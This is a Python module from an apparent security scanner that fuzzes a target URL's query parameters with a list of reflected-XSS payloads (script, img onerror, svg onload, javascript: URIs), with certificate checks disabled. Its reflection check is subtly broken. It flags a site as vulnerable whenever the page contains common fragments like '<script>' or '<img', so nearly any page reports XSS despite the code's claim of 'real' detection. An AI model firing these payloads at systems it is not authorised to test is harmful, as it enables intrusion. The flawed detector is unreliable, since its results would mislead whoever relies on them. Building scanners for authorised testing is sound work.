#!/usr/bin/env python3
"""
Valkyrie Module: Advanced XSS Scanner
Author: Sonia
Version: 2.0.0
Description: Real reflected XSS detection with multiple payloads,
             context-aware checking, and common parameter fuzzing.
"""

import aiohttp
import asyncio
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode
from datetime import datetime

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '<<script>alert(1)//<</script>',
]

COMMON_PARAMS = [
    'q', 'search', 'id', 'query', 'keyword', 'term',
    'name', 'input', 'text', 'msg', 'message', 'comment',
    'ref', 'url', 'redirect', 'next', 'page', 'data',
    'value', 'output', 'content', 'title', 'description'
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Valkyrie-Security-Scanner/2.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}


def _build_test_urls(target_url: str, payload: str) -> list:
    parsed = urlparse(target_url)
    test_urls = []

    existing_params = parse_qsl(parsed.query)
    if existing_params:
        injected = [(k, payload) for k, v in existing_params]
        new_query = urlencode(injected)
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        test_urls.append(test_url)

    for param in COMMON_PARAMS[:5]:
        new_query = urlencode([(param, payload)])
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
        test_urls.append(test_url)

    return test_urls


def _is_reflected(payload: str, response_body: str) -> bool:
    if payload in response_body:
        return True

    key_parts = ['<script>', 'onerror=', 'onload=', 'alert(', '<svg', '<img']
    for part in key_parts:
        if part.lower() in response_body.lower():
            return True

    return False


async def run(target_url: str, session: aiohttp.ClientSession) -> dict:
    findings = []
    tested_count = 0

    try:
        for payload in XSS_PAYLOADS:
            test_urls = _build_test_urls(target_url, payload)

            for test_url in test_urls[:3]:
                try:
                    async with session.get(
                        test_url,
                        headers=HEADERS,
                        timeout=aiohttp.ClientTimeout(total=8),
                        ssl=False,
                        allow_redirects=True
                    ) as response:

                        tested_count += 1

                        if response.status in (200, 302):
                            body = await response.text(errors='ignore')

                            if _is_reflected(payload, body):
                                findings.append({
                                    "payload": payload,
                                    "url": test_url,
                                    "status_code": response.status,
                                    "content_type": response.headers.get('Content-Type', 'unknown')
                                })
                                break

                except asyncio.TimeoutError:
                    continue
                except Exception:
                    continue

            await asyncio.sleep(0.3)

    except Exception as e:
        return {
            "status": "Error",
            "timestamp": datetime.utcnow().isoformat(),
            "summary": f"XSS scanner error: {str(e)}"
        }

    if findings:
        finding_details = []
        for f in findings:
            finding_details.append(
                f"PAYLOAD: {f['payload']} | URL: {f['url']} | Status: {f['status_code']}"
            )

        return {
            "status": "Vulnerable / Alert",
            "timestamp": datetime.utcnow().isoformat(),
            "summary": (
                f"⚠️  XSS DETECTED — {len(findings)} reflection(s) found "
                f"out of {tested_count} tests.\n" +
                "\n".join(finding_details)
            )
        }

    return {
        "status": "Safe / Clean",
        "timestamp": datetime.utcnow().isoformat(),
        "summary": (
            f"No XSS reflection detected. "
            f"Tested {tested_count} parameter combinations with "
            f"{len(XSS_PAYLOADS)} payloads."
        )
    }


if __name__ == "__main__":
    import sys

    async def _test():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com/search.php?test=query"
        print(f"\n[*] Testing XSS on: {target}\n")
        async with aiohttp.ClientSession() as session:
            result = await run(target, session)
            print(f"Status  : {result['status']}")
            print(f"Summary : {result['summary']}")

    asyncio.run(_test())
